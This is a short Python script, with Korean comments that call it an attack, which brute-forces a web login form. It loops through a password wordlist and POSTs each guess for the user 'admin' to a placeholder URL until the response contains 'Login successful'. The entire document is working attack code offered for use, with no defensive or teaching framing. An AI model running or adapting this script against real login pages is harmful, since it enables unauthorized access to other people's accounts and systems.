import requests

# 대상 URL과 로그인 폼 데이터 설정
url = "http://example.com/login"  # 대상 로그인 페이지 URL
username = "admin"  # 공격할 사용자 이름
password_file = "passwords.txt"  # 비밀번호 사전 파일

# 사전에서 비밀번호를 하나씩 가져와서 시도하는 함수
def brute_force_login(url, username, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()  # 공백 제거
            print(f"[*] Trying password: {password}")

            # 로그인 요청을 위한 데이터
            data = {
                'username': username,
                'password': password
            }

            # POST 요청 보내기
            response = requests.post(url, data=data)

            # 로그인 성공 여부 확인
            if "Login successful" in response.text:  # 성공 메시지에 따라 조건 변경
                print(f"[+] Password found: {password}")
                return True
            else:
                print(f"[-] Failed with password: {password}")

    print("[-] Password not found in the wordlist.")
    return False

# 공격 실행
brute_force_login(url, username, password_file)
